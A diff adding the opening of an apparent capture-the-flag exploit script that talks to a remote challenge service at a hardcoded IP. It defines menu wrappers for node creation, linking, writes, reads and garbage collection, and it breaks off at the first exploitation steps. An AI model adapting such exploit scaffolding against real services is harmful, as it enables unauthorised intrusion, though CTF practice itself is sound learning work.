@@ -1,3 +1,46 @@
+from braindead import *
+log.enable()
+args = Args()
+args.parse()
+
+#r = io.process(['./dual'])
+r = io.connect(('13.231.226.137', 9573))
+
+def create(pred):
+	r.sla('op>\n', '1')
+	r.sla('pred_id>\n', str(pred))
+	return int(r.rl().decode())
+
+def conn(pred, succ):
+	r.sla('op>\n', '2')
+	r.sla('pred_id>\n', str(pred))
+	r.sla('succ_id>\n', str(succ))
+
+def disc(pred, succ):
+	r.sla('op>\n', '3')
+	r.sla('pred_id>\n', str(pred))
+	r.sla('succ_id>\n', str(succ))
+
+def write_text(node_id, text):
+	r.sla('op>\n', '4')
+	r.sla('node_id>\n', str(node_id))
+	r.sla('text_len>\n', str(len(text)))
+	r.sa('text>\n', text)
+
+def write_bin(node_id, bin):
+	r.sla('op>\n', '5')
+	r.sla('node_id>\n', str(node_id))
+	r.sla('bin_len>\n', str(len(bin)))
+	r.sa('bin>\n', bin)
+
+def read_text(node_id, text_len):
+	r.sla('op>\n', '6')
+	r.sla('node_id>\n', str(node_id))
+	return r.recvn(text_len)
+
+def run_gc():
+	r.sla('op>\n', '7')
+
 victimizer = create(0) # @1
 pepega = create(0) # @2
 write_bin(pepega, "") # @3
